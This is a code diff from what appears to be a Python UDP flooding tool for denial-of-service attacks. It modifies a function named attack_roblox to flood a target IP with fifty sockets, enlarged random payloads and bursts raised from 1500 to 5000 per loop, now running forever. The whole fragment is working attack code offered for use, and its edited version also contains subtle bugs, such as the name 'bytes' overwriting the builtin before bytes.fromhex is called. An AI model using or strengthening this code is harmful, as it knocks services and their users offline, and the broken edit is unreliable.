@@ -58,15 +58,34 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
 
 def attack_roblox(ip, port, secs, size=65400):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(size)
-        dport = random.randint(1, 65535) if port == 0 else port
-        for _ in range(1500):
-            ran = random.randrange(10 ** 80)
-            hex = "%064x" % ran
-            hex = hex[:64]
-            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
+    while True:
+        end_time = time.time() + secs
+        while time.time() < end_time:
+            # Multi-socket approach for higher throughput
+            sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(50)]
+            
+            # Amplify packet size and randomize payload
+            base_bytes = random.urandom(size * 2)  # Double packet size
+            amp_factor = random.randint(2, 5)      # Amplification multiplier
+            bytes = base_bytes * amp_factor
+            
+            # Dynamic port randomization with fallback
+            dport = random.randint(1, 65535) if port == 0 else port
+            
+            # Increased iteration count with parallel bursts
+            for _ in range(5000):  # Boosted from 1500
+                ran = random.randrange(10 ** 80)
+                hex = "%064x" % ran
+                hex = hex[:64]
+                payload = bytes.fromhex(hex) + bytes
+                
+                # Multi-socket flood
+                for s in sockets:
+                    s.sendto(payload, (ip, dport))
+            
+            # Clean up sockets
+            for s in sockets:
+                s.close()
 
 def attack_junk(ip, port, secs):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
